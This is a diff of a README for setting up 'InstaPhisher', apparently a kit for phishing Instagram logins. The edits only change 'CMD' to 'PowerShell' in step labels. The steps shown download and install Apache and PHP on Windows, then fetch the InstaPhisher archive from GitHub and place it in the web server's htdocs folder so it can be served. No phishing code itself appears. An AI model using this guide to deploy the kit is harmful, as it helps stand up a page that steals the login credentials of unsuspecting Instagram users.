@@ -65,7 +65,7 @@ Powershell.exe Invoke-WebRequest -Uri "https://aka.ms/vs/16/release/VC_redist.x6
 start %userprofile%\Downloads\VC_redist.x64.exe
 ```
 
-4. Move apache24 folder to C:\apache24. CMD in administrator.
+4. Move apache24 folder to C:\apache24. PowerShell in administrator.
 ```
 cd %userprofile%\Downloads\httpd-2.4.43-win64-VS16
 move /Y %userprofile%\Downloads\httpd-2.4.43-win64-VS16\Apache24 C:\Apache24
@@ -75,7 +75,7 @@ move /Y %userprofile%\Downloads\httpd-2.4.43-win64-VS16\Apache24 C:\Apache24
 -	Open C:/Apache24/httpd.conf with notepad
 -	line 162: replace "#LoadModule rewrite_module modules/mod_rewrite.so" to "LoadModule rewrite_module modules/mod_rewrite.so"
 
-6. Install Apache, CMD in administrator mode. CMD in administrator.
+6. Install Apache, CMD in administrator mode. PowerShell in administrator.
 ```
 cd /Apache24/bin
 httpd -k install
@@ -91,12 +91,12 @@ Powershell.exe Invoke-WebRequest -Uri "https://windows.php.net/downloads/qa/php-
 Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\php-7.4.5RC1-Win32-vc15-x64.zip" -DestinationPath "%userprofile%\Downloads\php"
 ```
 
-9. Move all file in php-7.4.5RC1-Win32-vc15-x64 folder to C:\php. CMD in administrator.
+9. Move all file in php-7.4.5RC1-Win32-vc15-x64 folder to C:\php. PowerShell in administrator.
 ```
 move /Y %userprofile%\Downloads\php C:\
 ```
 
-10. Rename C:/php/php.ini-development to C:/php/php.ini. CMD in administrator.
+10. Rename C:/php/php.ini-development to C:/php/php.ini. PowerShell in administrator.
 ```
 rename C:\php\php.ini-development C:\php\php.ini
 ```
@@ -111,7 +111,7 @@ AddHandler application/x-httpd-php .php
 
 ## InstaPhisher download
 
-1. Download InstaPhisher, extract and move to apache server folder (apache24\htdocs). Cmd in administrator.
+1. Download InstaPhisher, extract and move to apache server folder (apache24\htdocs). PowerShell in administrator.
 ```
 Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/archive/master.zip" -OutFile "%userprofile%\Downloads\InstaPhisher.zip"
 Powershell.exe Expand-Archive -Path "%userprofile%\Downloads\InstaPhisher.zip" -DestinationPath "%userprofile%\Downloads\InstaPhisher"
